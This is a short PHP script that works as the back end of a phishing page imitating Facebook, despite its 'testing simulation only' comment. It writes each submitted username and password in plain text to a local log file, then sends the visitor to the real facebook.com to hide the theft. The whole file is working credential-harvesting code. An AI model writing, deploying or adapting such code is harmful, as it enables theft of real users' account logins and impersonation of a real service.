<?php
// For testing simulation only
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $user = $_POST['username'];
  $pass = $_POST['password'];

  // Simulated logging - NEVER do this on real servers
  file_put_contents("log.txt", "User: $user | Pass: $pass\n", FILE_APPEND);

  // Redirect or simulate action
  header('Location: https://facebook.com'); // Redirect to real FB after capture
  exit();
}
?>
